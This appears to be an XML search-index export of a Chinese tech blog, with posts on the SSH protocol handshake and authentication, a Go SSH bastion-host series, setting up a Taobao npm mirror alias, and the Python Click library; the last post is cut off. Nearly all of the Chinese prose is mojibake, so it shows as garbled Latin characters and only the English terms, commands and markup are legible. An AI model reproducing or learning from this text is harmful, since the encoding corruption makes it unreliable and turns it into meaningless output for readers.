ç”¨äºå‘æœåŠ¡å™¨æä¾›å®¢æˆ·ç«¯ç”¨æˆ·é‰´åˆ«åŠŸèƒ½ã€‚å®ƒè¿è¡Œåœ¨ä¼ è¾“å±‚åè®®SSH-TRANSä¸Šé¢ã€‚å½“SSH-USERAUTHå¼€å§‹åï¼Œå®ƒä»ä½å±‚åè®®é‚£é‡Œæ¥æ”¶ä¼šè¯æ ‡è¯†ç¬¦(ä»ç¬¬ä¸€æ¬¡å¯†é’¥äº¤æ¢ä¸­çš„äº¤æ¢å“ˆå¸ŒH). ä¼šè¯æ ‡è¯†ç¬¦å”¯ä¸€æ ‡è¯†æ­¤ä¼šè¯å¹¶ä¸”é€‚ç”¨äºæ ‡è®°ä»¥è¯æ˜ç§é’¥çš„æ‰€æœ‰æƒã€‚ SSH-USERAUTHä¹Ÿéœ€è¦çŸ¥é“ä½å±‚åè®®æ˜¯å¦æä¾›ä¿å¯†æ€§ä¿æŠ¤ã€‚ è¿æ¥åè®®[SSH-CONNECT]ä¹Ÿå«: The Connection Protocol, å°†å¤šä¸ªåŠ å¯†éš§é“åˆ†æˆé€»è¾‘é€šé“ã€‚å®ƒè¿è¡Œåœ¨ç”¨æˆ·è®¤è¯åè®®ä¸Šã€‚å®ƒæä¾›äº†äº¤äº’å¼ç™»å½•è¯è·¯ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€è½¬å‘TCP/IPè¿æ¥å’Œè½¬å‘X11è¿æ¥ã€‚å„ç§é«˜å±‚åº”ç”¨åè®®å¯ä»¥ç›¸å¯¹åœ°ç‹¬ç«‹äºSSHåŸºæœ¬ä½“ç³»ä¹‹å¤–ï¼Œå¹¶ä¾é è¿™ä¸ªåŸºæœ¬æ¡†æ¶ï¼Œé€šè¿‡è¿æ¥åè®®ä½¿ç”¨SSHçš„å®‰å…¨æœºåˆ¶ã€‚ å·¥ä½œè¿‡ç¨‹è¿™å¼ å›¾æè¿°äº†sshäº¤æ¢çš„æ•´ä¸ªè¿‡ç¨‹: Clientç«¯å‘Serverç«¯å‘èµ·SSHè¿æ¥è¯·æ±‚ã€‚ Serverç«¯å‘Clientç«¯å‘èµ·ç‰ˆæœ¬åå•†ã€‚ åå•†ç»“æŸåServerç«¯å‘é€Host Keyå…¬é’¥ Server Keyå…¬é’¥ï¼Œéšæœºæ•°ç­‰ä¿¡æ¯ã€‚åˆ°è¿™é‡Œæ‰€æœ‰é€šä¿¡æ˜¯ä¸åŠ å¯†çš„ã€‚ Clientç«¯è¿”å›ç¡®è®¤ä¿¡æ¯ï¼ŒåŒæ—¶é™„å¸¦ç”¨å…¬é’¥åŠ å¯†è¿‡çš„ä¸€ä¸ªéšæœºæ•°ï¼Œç”¨äºåŒæ–¹è®¡ç®—Session Keyã€‚ è¿›å…¥è®¤è¯é˜¶æ®µã€‚ä»æ­¤ä»¥åæ‰€æœ‰é€šä¿¡å‡åŠ å¯†ã€‚ è®¤è¯æˆåŠŸåï¼Œè¿›å…¥äº¤äº’é˜¶æ®µã€‚ é’ˆå¯¹è¿™é¡¹é˜¶æ®µå‘ç”Ÿåœ¨åæˆçš„é‚£ä¸€éƒ¨åˆ†æœ‰ä¸€ä¸ªç®€å•çš„æ€»ç»“: å‘ç”Ÿåœ¨ä¼ è¾“å±‚çš„: ç‰ˆæœ¬åå•†å’Œç®—æ³•åå•†. å‘ç”Ÿåœ¨ç”¨æˆ·è®¤è¯å±‚çš„: ç”¨æˆ·è®¤è¯. å‘ç”Ÿåœ¨é“¾æ¥å±‚çš„: å›è¯äº¤äº’ ç‰ˆæœ¬åå•† æœåŠ¡å™¨ç›‘å¬22ç«¯å£ï¼Œç­‰å¾…å®¢æˆ·ç«¯è¿æ¥ã€‚ å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘èµ·TCPåˆå§‹è¿æ¥è¯·æ±‚ï¼ŒTCPè¿æ¥å»ºç«‹åï¼ŒæœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€ç¬¬ä¸€ä¸ªæŠ¥æ–‡ï¼ŒåŒ…æ‹¬ç‰ˆæœ¬æ ‡å¿—å­—ç¬¦ä¸²ï¼Œæ ¼å¼ä¸ºâ€œSSHï¼&lt;ä¸»åè®®ç‰ˆæœ¬å·&gt;.&lt;æ¬¡åè®®ç‰ˆæœ¬å·&gt;ï¼&lt;è½¯ä»¶ç‰ˆæœ¬å·&gt;â€ï¼Œåè®®ç‰ˆæœ¬å·ç”±ä¸»ç‰ˆæœ¬å·å’Œæ¬¡ç‰ˆæœ¬å·ç»„æˆï¼Œè½¯ä»¶ç‰ˆæœ¬å·ä¸»è¦æ˜¯ä¸ºè°ƒè¯•ä½¿ç”¨ã€‚ å®¢æˆ·ç«¯æ”¶åˆ°æŠ¥æ–‡åï¼Œè§£æè¯¥æ•°æ®åŒ…ï¼Œå¦‚æœæœåŠ¡å™¨ç«¯çš„åè®®ç‰ˆæœ¬å·æ¯”è‡ªå·±çš„ä½ï¼Œä¸”å®¢æˆ·ç«¯èƒ½æ”¯æŒæœåŠ¡å™¨ç«¯çš„ä½ç‰ˆæœ¬ï¼Œå°±ä½¿ç”¨æœåŠ¡å™¨ç«¯çš„ä½ç‰ˆæœ¬åè®®å·ï¼Œå¦åˆ™ä½¿ç”¨è‡ªå·±çš„åè®®ç‰ˆæœ¬å·ã€‚ å®¢æˆ·ç«¯å›åº”æœåŠ¡å™¨ä¸€ä¸ªæŠ¥æ–‡ï¼ŒåŒ…å«äº†å®¢æˆ·ç«¯å†³å®šä½¿ç”¨çš„åè®®ç‰ˆæœ¬å·ã€‚æœåŠ¡å™¨æ¯”è¾ƒå®¢æˆ·ç«¯å‘æ¥çš„ç‰ˆæœ¬å·ï¼Œå†³å®šæ˜¯å¦èƒ½åŒå®¢æˆ·ç«¯ä¸€èµ·å·¥ä½œã€‚ å¦‚æœåå•†æˆåŠŸï¼Œåˆ™è¿›å…¥å¯†é’¥å’Œç®—æ³•åå•†é˜¶æ®µï¼Œå¦åˆ™æœåŠ¡å™¨ç«¯æ–­å¼€TCPè¿æ¥ã€‚ å› ä¸ºç‰ˆæœ¬åå•†å‘ç”Ÿåœ¨ä¸ºåŠ å¯†ä¹‹å‰, æ‰€ä»¥ç‰ˆæœ¬åå•†æ˜¯æ˜æ–‡çš„ ç®—æ³•åå•† æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯åˆ†åˆ«å‘é€ç®—æ³•åå•†æŠ¥æ–‡ç»™å¯¹ç«¯ï¼ŒæŠ¥æ–‡ä¸­åŒ…å«è‡ªå·±æ”¯æŒçš„å…¬é’¥ç®—æ³•åˆ—è¡¨ã€åŠ å¯†ç®—æ³•åˆ—è¡¨ã€MAC(Message Authentication Codeï¼Œæ¶ˆæ¯éªŒè¯ç )ç®—æ³•åˆ—è¡¨ã€å‹ç¼©ç®—æ³•åˆ—è¡¨ç­‰; æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯æ ¹æ®å¯¹ç«¯å’Œæœ¬ç«¯æ”¯æŒçš„ç®—æ³•åˆ—è¡¨å¾—å‡ºæœ€ç»ˆä½¿ç”¨çš„ç®—æ³•ã€‚ æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯åˆ©ç”¨ECDHäº¤æ¢ç®—æ³•ã€ä¸»æœºå¯†é’¥å¯¹ç­‰å‚æ•°ï¼Œç”Ÿæˆä¼šè¯å¯†é’¥å’Œä¼šè¯IDã€‚ é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼ŒæœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯å°±å–å¾—äº†ç›¸åŒçš„ä¼šè¯å¯†é’¥å’Œä¼šè¯ID, ç”¨äºåŠ å¯†ä¼ è¾“çš„æ•°æ®, åˆ°æ­¤é“¾æ¥åŠ å¯†å®Œæˆã€‚ ç”¨æˆ·è®¤è¯ å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘é€è®¤è¯è¯·æ±‚ï¼Œè®¤è¯è¯·æ±‚ä¸­åŒ…å«ç”¨æˆ·åã€è®¤è¯æ–¹æ³•ã€ä¸è¯¥è®¤è¯æ–¹æ³•ç›¸å…³çš„å†…å®¹ï¼ˆå¦‚ï¼špasswordè®¤è¯æ—¶ï¼Œå†…å®¹ä¸ºå¯†ç ï¼‰ã€‚ æœåŠ¡å™¨ç«¯å¯¹å®¢æˆ·ç«¯è¿›è¡Œè®¤è¯ï¼Œå¦‚æœè®¤è¯å¤±è´¥ï¼Œåˆ™å‘å®¢æˆ·ç«¯å‘é€è®¤è¯å¤±è´¥æ¶ˆæ¯ï¼Œå…¶ä¸­åŒ…å«å¯ä»¥å†æ¬¡è®¤è¯çš„æ–¹æ³•åˆ—è¡¨ã€‚ å®¢æˆ·ç«¯ä»è®¤è¯æ–¹æ³•åˆ—è¡¨ä¸­é€‰å–ä¸€ç§è®¤è¯æ–¹æ³•å†æ¬¡è¿›è¡Œè®¤è¯ã€‚ è¯¥è¿‡ç¨‹åå¤è¿›è¡Œï¼Œ ç›´åˆ°è®¤è¯æˆåŠŸæˆ–è€…è®¤è¯æ¬¡æ•°è¾¾åˆ°ä¸Šé™ï¼Œ æœåŠ¡å™¨å…³é—­è¿æ¥ä¸ºæ­¢ã€‚ ç”¨æˆ·è®¤è¯æ˜¯åœ¨åŠ å¯†è¿‡ä¼šè¿›è¡Œçš„, æ‰€ä»¥ç”¨äºè®¤è¯çš„æ•°æ®æ˜¯ä¸ä¼šæš´éœ²çš„,é€šå¸¸è€Œè¨€SSHæä¾›2è®¤è¯æ–¹å¼: passwordè®¤è¯ï¼šå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘å‡º passwordè®¤è¯è¯·æ±‚ï¼Œå°†ç”¨æˆ·åå’Œå¯†ç åŠ å¯†åå‘é€ç»™æœåŠ¡å™¨ï¼›æœåŠ¡å™¨å°†è¯¥ä¿¡æ¯è§£å¯†åå¾—åˆ°ç”¨æˆ·åå’Œå¯†ç çš„æ˜æ–‡ï¼Œä¸è®¾å¤‡ä¸Šä¿å­˜çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶è¿”å›è®¤è¯æˆåŠŸæˆ–å¤±è´¥çš„æ¶ˆæ¯ã€‚ publickey è®¤è¯ï¼šé‡‡ç”¨æ•°å­—ç­¾åçš„æ–¹æ³•æ¥è®¤è¯å®¢æˆ·ç«¯ã€‚ç›®å‰ï¼Œè®¾å¤‡ä¸Šå¯ä»¥åˆ©ç”¨RSAå’Œ DSAä¸¤ç§å…¬å…±å¯†é’¥ç®—æ³•å®ç°æ•°å­—ç­¾åã€‚å®¢æˆ·ç«¯å‘é€åŒ…å«ç”¨æˆ·åã€å…¬å…±å¯†é’¥å’Œå…¬å…±å¯†é’¥ç®—æ³•çš„ publickey è®¤è¯è¯·æ±‚ç»™æœåŠ¡å™¨ç«¯ã€‚æœåŠ¡å™¨å¯¹å…¬é’¥è¿›è¡Œåˆæ³•æ€§æ£€æŸ¥ï¼Œå¦‚æœä¸åˆæ³•ï¼Œåˆ™ç›´æ¥å‘é€å¤±è´¥æ¶ˆæ¯ï¼›å¦åˆ™ï¼ŒæœåŠ¡å™¨åˆ©ç”¨æ•°å­—ç­¾åå¯¹å®¢æˆ·ç«¯è¿›è¡Œè®¤è¯ï¼Œå¹¶è¿”å›è®¤è¯æˆåŠŸæˆ–å¤±è´¥çš„æ¶ˆæ¯SSH2.0è¿˜æä¾›äº† password-publickey è®¤è¯å’Œ any è®¤è¯: password-publickey è®¤è¯ï¼šæŒ‡å®šè¯¥ç”¨æˆ·çš„è®¤è¯æ–¹å¼ä¸º password å’Œ publickeyè®¤è¯åŒæ—¶æ»¡è¶³ã€‚å®¢æˆ·ç«¯ç‰ˆæœ¬ä¸º SSH1çš„ç”¨æˆ·åªè¦é€šè¿‡å…¶ä¸­ä¸€ç§è®¤è¯å³å¯ç™»å½•ï¼›å®¢æˆ·ç«¯ç‰ˆæœ¬ä¸º SSH2çš„ç”¨æˆ·å¿…é¡»ä¸¤ç§è®¤è¯éƒ½é€šè¿‡æ‰èƒ½ç™»å½•ã€‚ anyè®¤è¯ï¼šæŒ‡å®šè¯¥ç”¨æˆ·çš„è®¤è¯æ–¹å¼å¯ä»¥æ˜¯ passwordï¼Œä¹Ÿå¯ä»¥æ˜¯ publickeyã€‚ ä¸€èˆ¬è€Œè¨€é»˜è®¤ä½¿ç”¨çš„anyã€‚è¿™å¼ å›¾æè¿°äº†åœ¨åŠ å¯†è¿‡ç¨‹ä¸Šçš„è®¤è¯: ä¼šè¯äº¤äº’ä¼šè¯è¯·æ±‚é˜¶æ®µï¼š æœåŠ¡å™¨ç­‰å¾…å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼› è®¤è¯é€šè¿‡åï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¼šè¯è¯·æ±‚ï¼› æœåŠ¡å™¨å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚è¯·æ±‚è¢«æˆåŠŸå¤„ç†åï¼Œ æœåŠ¡å™¨ä¼šå‘å®¢æˆ·ç«¯å›åº” SSH_SMSG_SUCCESSåŒ…ï¼ŒSSHè¿›å…¥äº¤äº’ä¼šè¯é˜¶æ®µï¼›å¦åˆ™å›åº” SSH_SMSG_FAILUREåŒ…ï¼Œè¡¨ç¤ºæœåŠ¡å™¨å¤„ç†è¯·æ±‚å¤±è´¥æˆ–è€…ä¸èƒ½è¯†åˆ«è¯·æ±‚ã€‚ äº¤äº’ä¼šè¯é˜¶æ®µï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œæ•°æ®è¢«åŒå‘ä¼ é€: å®¢æˆ·ç«¯å°†è¦æ‰§è¡Œçš„å‘½ä»¤åŠ å¯†åä¼ ç»™æœåŠ¡å™¨; æœåŠ¡å™¨æ¥æ”¶åˆ°æŠ¥æ–‡ï¼Œè§£å¯†åæ‰§è¡Œè¯¥å‘½ä»¤,å°†æ‰§è¡Œçš„ç»“æœåŠ å¯†å‘è¿˜ç»™å®¢æˆ·ç«¯; å®¢æˆ·ç«¯å°†æ¥æ”¶åˆ°çš„ç»“æœè§£å¯†åæ˜¾ç¤ºåˆ°ç»ˆç«¯ä¸Š.]]></content>
      <categories>
        <category>åè®®è¯¦è§£</category>
        <category>ssh</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è·³æ¿æœºç³»åˆ—(ä¸€)-æ¶æ„ä¸ç®€ä»‹]]></title>
    <url>%2F2017%2F02%2F15%2Fgo-ssh%2F</url>
    <content type="text"><![CDATA[ä¸€ç›´å‚ä¸JumpServerçš„å¼€å‘, ä¹Ÿä¸€ç›´åœ¨æƒ³å¦‚ä½•è®¾è®¡ä¸€ä¸ªç›¸å¯¹å®Œç¾çš„è·³æ¿æœº, è·³æ¿æœºçš„æœ¬è´¨æ˜¯sshåè®®çš„åå‘ä»£ç†(ä¸»è¦è¿˜æ˜¯ssh, è‡³äºrdpè¿˜æ²¡æƒ³è¿‡), è™½ç„¶ä¹Ÿç»å¸¸ä½¿ç”¨ssh(åšè¿ç»´çš„æ—¶å€™è¿˜ä¸“é—¨å°±sshå­¦ä¹ è¿‡), ä½†ä¹Ÿä»…ä»…æ˜¯sshå®¢æˆ·ç«¯çš„ä½¿ç”¨ä»¥åŠæœåŠ¡ç«¯çš„é…ç½®, æˆ‘è§‰å¾—ä¸€ä¸ªå®Œç¾çš„è·³æ¿æœºåº”è¯¥æ˜¯ä»åè®®å±‚é¢è§£å†³è¿™ä¸ªé—®é¢˜ã€‚å› æ­¤æ‰“ç®—ä»¥Golangä¸ºå¼€å‘è¯­è¨€(å› ä¸ºsshåº“å®Œå–„ï¼Œwebsocketç¼–å†™ç®€å•),å¼€å‘ä¸€ä¸ªæœ‰åŸºæœ¬åŠŸèƒ½çš„è·³æ¿æœºã€‚ æ¦‚è¿°è¿™ä¸€ç³»åˆ—çš„åšå®¢ åŒ…å«å¾ˆå¤šç¯‡, ä¸»è¦ç›®çš„æ˜¯: åœ¨ä¹‹å‰çš„ç»éªŒä¸Š, æŠŠå¼€å‘è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ‰€æœ‰çŸ¥è¯†å’Œæ„Ÿæƒ³è®°å½•ä¸‹æ¥(å½“ç„¶åŒ…å«æºç ), è¿™ä¸€ç³»åˆ—æ¶‰åŠå¦‚ä¸‹æ–‡ç« , ç”±æµ…å…¥æ·±, å¾ªåºæ¸è¿›çš„ä»‹ç»å¼€å‘è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„å„ç§çŸ¥è¯†: è·³æ¿æœºç³»åˆ—(ä¸€)-æ¶æ„ä¸ç®€ä»‹ è·³æ¿æœºç³»åˆ—(äºŒ)-sshåè®®åŸç†ç®€ä»‹ è·³æ¿æœºç³»åˆ—(ä¸‰)-Golangä¸­SSHå®¢æˆ·ç«¯çš„å®ç° ç®€å•æ¶æ„ä¹‹å‰JumpServerçš„æ ¸å¿ƒæ˜¯æŒ‰ç…§ç®€å•çš„æ¶æ„æ¥å¼€å‘çš„, ä¸€ä¸ªç®€å•çš„æ¶æ„å…¶å®å·²ç»æœ‰å¾ˆå¤šä¸é”™çš„demoæˆ–è€…äº§å“äº†, æ¯”å¦‚è¿™ä¸ªé¡¹ç›®webconsole, å½“ç„¶ä»–ä¸å®Œæ•´ä»…ä»…å®ç°äº†webï¼Œè‡³äºå‘½ä»¤è¡Œå¹¶æ²¡æœ‰å®ç°, è€Œjumpserverè¿™2ä¸ªéƒ½å®ç°äº†ã€‚ä¸ºä»€ä¹ˆç§°ä¹‹ä¸ºç®€å•çš„æ¶æ„, å› ä¸ºä»–çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯: å°±æ˜¯æ¨¡æ‹Ÿä¸€ä¸ªç»ˆç«¯(webç«¯çš„xtermè¿™ä¸ªjsåº“å°±æ˜¯å¹²è¿™ä¸ªäº‹å„¿çš„, è€Œå‘½ä»¤è¡ŒåŒæ ·æ¨¡æ‹Ÿä¸€ä¸ªç»ˆç«¯å°±è¡Œäº†, æ¯”å¦‚golangçš„ssh/terminalè¿™ä¸ªåº“å°±å¯ä»¥å®Œæˆè¿™ä¸ªäº‹å„¿),ç„¶åé€šè¿‡ä¸€ä¸ªssh agentè®¿é—®åé¢çš„çœŸå®çš„æœåŠ¡å™¨ï¼Œèµ·åˆ°ä¸€ä¸ªä»£ç†è½¬å‘çš„ä½œç”¨ã€‚ è¿™ç§æ¨¡å¼çš„ç¼ºé™·ä¸»è¦ä½“ç°åœ¨å‘½ä»¤è¡Œç»ˆç«¯ä¸Šé¢, å› ä¸ºæ­¤æ—¶ç»ˆç«¯åé¢æ¥çš„å°±æ˜¯sshå®¢æˆ·ç«¯, å› æ­¤è¿™ä¸ªç»ˆç«¯æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯å’Œè·³æ¿æœºç»‘å®šåœ¨ä¸€èµ·äº†, ç”¨æˆ·åªæœ‰å…ˆç™»å½•è·³æ¿æœºæ‰èƒ½ä½¿ç”¨ä»£ç†æœåŠ¡, è€Œè¿™æ˜¾ç„¶æ˜¯ä¸åˆç†çš„,Jumpserveråœ¨æ­¤ä¸Šè¿›è¡Œäº†æ”¹è¿›, é€šè¿‡å†æ·»åŠ ä¸€ä¸ªssh serverç›‘å¬, å®é™…ä¸Šå°±æ˜¯ssh-in-sshã€‚ æ¶æ„æ”¹è¿›æ”¹è¿›è¿‡åä¸»è¦åŠ å…¥ä¸€ä¸ªsshçš„ä»£ç†æœåŠ¡,ç»Ÿä¸€ä»£ç†å±‚, æŠ½ç¦»å®¢æˆ·ç«¯ã€‚ å®Œç¾æ¶æ„ä¸ªäººæ¶æ„çš„èƒ½åŠ›è¿˜æ˜¯å¾ˆèœçš„, å¯¹sshåè®®çš„ç†è§£ä¹Ÿä¸æ·±, å½“çœ‹åˆ°teleportè¿™ä¸ªå¼€æºäº§å“çš„è®¾è®¡æ—¶, å®Œå…¨è¢«æƒŠå‘†äº†ã€‚ è¿™ä¸å°±æ˜¯æˆ‘æƒ³è¦çš„æ¶æ„å˜›, è€Œä¸”ç»†èŠ‚æ˜¯åšçš„é‚£ä¹ˆçš„æ¼‚äº®ã€‚åæœŸå¦‚æœæœ‰æ—¶é—´çš„è¯, æ‰“ç®—å†™ä¸€ä¸ªå…³äºteleportæºç è§£è¯»çš„ç³»åˆ—, ä¸€ç‚¹ä¸€ä¸ªå‰–æè¿™ä¸ªå®Œç¾æ¶æ„çš„å®ç°ã€‚ æ€»ç»“å†™è¿™ä¸€ä¸ªç³»åˆ—ä¸å®¹æ˜“, è¿™æ˜¯ä¸€ä¸ªå¼€ç¯‡å’Œè§„åˆ’ï¼Œå¸Œæœ›æœ€åèƒ½å®Œç¾çš„æ”¶å°¾ï¼Œæœ‰ä¸€ä¸ªä¸é”™çš„demoå±•ç¤ºç»™å¤§å®¶ã€‚ç°åœ¨çœ‹æ¥teleportå·²ç»å¾ˆå®Œå–„äº†, ä¹Ÿç¬¦åˆæˆ‘å¿ƒç›®ä¸­çš„è·³æ¿æœºçš„æ ·å­, ç­‰è¯»å®Œteleportæºç è¿‡å, çœ‹å…¶æ˜¯å¦å®Œå–„, æ‰©å±•æ˜¯å¦æ–¹ä¾¿, å› æ­¤å¾ˆæœ‰å¯èƒ½æ˜¯å®Œå–„teleport,è€Œä¸æ˜¯ä»å¤´å¼€å§‹ã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nodejsæºåŠ é€Ÿ]]></title>
    <url>%2F2017%2F02%2F14%2Fnodejs-accelerate%2F</url>
    <content type="text"><![CDATA[ä¹‹å‰ä»‹ç»è¿‡ä½¿ç”¨vscodeæ­å»ºnodejså¼€å‘ç¯å¢ƒ, ç¯å¢ƒæ˜¯æ­å»ºå¥½äº†, ä½¿ç”¨æ—¶æœ‰ä¸€ä¸ªç¡¬ä¼¤, å°±æ˜¯nodejså®˜æ–¹çš„æºä¸‹è½½å¥‡æ…¢, è€Œä¸€èˆ¬jsçš„é¡¹ç›®ä¾èµ–åˆå¤š, æ‰€ä»¥ç»å¸¸çš„ç»“æœå°±æ˜¯: æ…¢å¾—ä½ å•¥éƒ½è£…ä¸ä¸Š(time out)ã€‚æ€ä¹ˆè§£å†³å–ƒï¼Ÿ å½“ç„¶æ˜¯æ¢å›½å†…çš„æºã€‚æˆ‘ä»…ä½¿ç”¨è¿‡æ·˜å®çš„åŠ é€Ÿæºï¼Œæ•ˆæœä¸é”™ï¼Œä¸€ç›´ç”¨ç€ï¼Œä¸‹é¢åšç®€å•çš„ä»‹ç»ã€‚ ç®€ä»‹æ·˜å®NPMé•œåƒå®˜æ–¹æ˜¯è¿™æ ·æè¿°çš„: è¿™æ˜¯ä¸€ä¸ªå®Œæ•´ npmjs.org é•œåƒï¼Œä½ å¯ä»¥ç”¨æ­¤ä»£æ›¿å®˜æ–¹ç‰ˆæœ¬(åªè¯»)ï¼ŒåŒæ­¥é¢‘ç‡ç›®å‰ä¸º 10åˆ†é’Ÿ ä¸€æ¬¡ä»¥ä¿è¯å°½é‡ä¸å®˜æ–¹æœåŠ¡åŒæ­¥ã€‚å…³äºæ›´å¤šçš„ä¿¡æ¯è¯·æŸ¥çœ‹:æ·˜å®NPMæºå®˜ç½‘ åŒæ­¥ä»registry.npm.taobao.orgå®‰è£…æ‰€æœ‰æ¨¡å—. å½“å®‰è£…çš„æ—¶å€™å‘ç°å®‰è£…çš„æ¨¡å—è¿˜æ²¡æœ‰åŒæ­¥è¿‡æ¥, æ·˜å®NPMä¼šè‡ªåŠ¨åœ¨åå°è¿›è¡ŒåŒæ­¥, å¹¶ä¸”ä¼šè®©ä½ ä»å®˜æ–¹ NPM registry.npmjs.org è¿›è¡Œå®‰è£…. ä¸‹æ¬¡ä½ å†å®‰è£…è¿™ä¸ªæ¨¡å—çš„æ—¶å€™, å°±ä¼šç›´æ¥ä» æ·˜å® NPM å®‰è£…äº†. å®‰è£…ä¸´æ—¶ä½¿ç”¨çš„è¯, å¯ä»¥é€šè¿‡registryå‚æ•°æ¥æŒ‡å®šæ·˜å®æºåœ°å€ï¼Œæ¯”å¦‚1npm --registry=https://registry.npm.taobao.org xterm å½“ç„¶ä¹Ÿå¯ä»¥æ·»åŠ å‘½ä»¤åˆ«å,è¿™æ ·å°±ä¸ç”¨æ¯æ¬¡éƒ½æ·»åŠ â€“registryäº†12345678910alias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \--cache=$HOME/.npm/.cache/cnpm \--disturl=https://npm.taobao.org/dist \--userconfig=$HOME/.cnpmrc&quot;# Or alias it in .bashrc or .zshrc$ echo &apos;\n#alias for cnpm\nalias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \ --cache=$HOME/.npm/.cache/cnpm \ --disturl=https://npm.taobao.org/dist \ --userconfig=$HOME/.cnpmrc&quot;&apos; &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc å…¶å®æ·˜å®çš„æºå¾ˆç¨³å®šï¼ŒåŒæ­¥é¢‘ç‡ä¹Ÿå¿«ï¼Œå› æ­¤ä¸€èˆ¬ç›´æ¥æ›¿æ¢ç³»ç»Ÿçš„npmä¹Ÿå¯ä»¥1npm install -g cnpm --registry=https://registry.npm.taobao.org]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>æºåŠ é€Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonå‘½ä»¤è¡Œå¼€å‘ç¥å™¨-click]]></title>
    <url>%2F2017%2F02%2F08%2Fpython-click%2F</url>
    <content type="text"><![CDATA[ä¹‹å‰å†™è¿‡ä¸€ç¯‡åšå®¢ä»‹ç»è¿‡å¦‚ä½•å†™æ¼‚äº®çš„å‘½ä»¤è¡Œå·¥å…·, ä¸è¿‡ä½¿ç”¨çš„æ˜¯golangçš„cobraåº“, æ•´ä½“è€Œè¨€æ•ˆæœå’Œä½¿ç”¨ä½“éªŒè¿˜æ˜¯éå¸¸ä¸é”™çš„, ä¸è¿‡ä»Šå¤©çœ‹åšå®¢æ—¶å‘ç°äº†ä¸€ä¸ªæ›´ä¸é”™çš„åº“ï¼Œè€Œä¸”æ˜¯Pythonçš„: Click,æ‰€ä»¥ç”¨èµ·æ¥åº”è¯¥æ›´å¾—å¿ƒåº”æ‰‹ã€‚ ä¹‹å‰åœ¨å¼€å‘openstackå®¢æˆ·ç«¯æ—¶, æ¨¡ä»¿openstack sdkå†™è¿‡CLI, ä»–ä¹Ÿæ˜¯å¯¹argparseåº“ä¸Šåšçš„å°è£…, ä½†æ˜¯ä½¿ç”¨èµ·æ¥ä¹Ÿæ¯”è¾ƒå¤æ‚, ç®€å•çœ‹äº†ä¸‹clickçš„æ–‡æ¡£, ä½“éªŒè¿˜æ˜¯éå¸¸ä¸é”™çš„ã€‚ ç®€ä»‹å…ˆè¯´ä¸‹clickçš„å‡ºç”Ÿ, å› ä¸ºä»–å‡ºç”Ÿåé—¨: Pocoo, Pocooæ˜¯ä¸€ä¸ªå›¢é˜Ÿï¼ŒPocooå‡ºå“å¿…æ˜¯ç²¾å“,æ¯”å¦‚ Flask, Werkzeug, Jinja 2 , Pygments, Sphinxã€‚å†²ç€pocooçš„å“ç‰Œ, éƒ½åº”è¯¥å¤šçœ‹ä¸€çœ¼clickã€‚clickæ˜¯ä¸€ä¸ªç”¨äºå¿«é€Ÿæ„å»ºå‘½ä»¤è¡Œçš„pythonçš„ç¬¬ä¸‰æ–¹æ¨¡å—, åŠŸèƒ½å¼ºå¤§, ä½¿ç”¨ç®€å•ã€‚æˆ‘ä»¬éƒ½çŸ¥é“Pythonå†…ç½®çš„Argparseæ¨¡å—ï¼Œä»¥å‰ä¹Ÿç»å¸¸ç”¨åˆ°, å½“æ—¶è§‰å¾—Argparseå¾ˆä¸é”™, å› ä¸ºæ²¡æœ‰å¯¹æ¯”(æ²¡æœ‰å¯¹æ¯”å°±æ²¡ä¼¤å®³), çœ‹äº†ä¸‹Clické©¬ä¸Šå°±è§‰å¾—Argparseå¤ªç¹çäº†ï¼ŒClickç›¸è¾ƒäºArgparseå°±å¥½æ¯”requestså¯¹æ¯”urllibã€‚æˆ‘ä»¬çœ‹çœ‹clickå®˜æ–¹æ–‡æ¡£ä¸Šæ˜¯æ€ä¹ˆè¯´æ˜clickçš„ï¼š Clickæ˜¯ä¸€ä¸ªä½¿ç”¨æœ€å°‘ä»£ç æ„å»ºæ¼‚äº®CLIçš„å‘½ä»¤è¡Œç•Œé¢åˆ›å»ºå·¥å…·åŒ…, é«˜åº¦å¯é…ç½®,ä½†æ˜¯å´å¼€ç®±å³ç”¨ä»–æœ‰3ä¸ªç‰¹ç‚¹ï¼š æ”¯æŒå‘½ä»¤çš„ä»»æ„åµŒå¥— æ”¯æŒå‘½ä»¤è¡Œå¸®åŠ©é¡µé¢çš„è‡ªåŠ¨ç”Ÿæˆ æ”¯æŒå­å‘½ä»¤è¿è¡Œæ—¶æƒ°æ€§åŠ è½½ å¿«é€Ÿä½¿ç”¨æ„å»ºCLIæœ‰2ä¸ªè¦ç‚¹: å‘½ä»¤å’Œå‚æ•°, ä½¿ç”¨clickæ—¶ï¼Œ@click.command()ç”¨æˆ·è£…é¥°å‘½ä»¤, @click.option()å’Œ@click.argument()ç”¨äºè£…é¥°å‚æ•°, 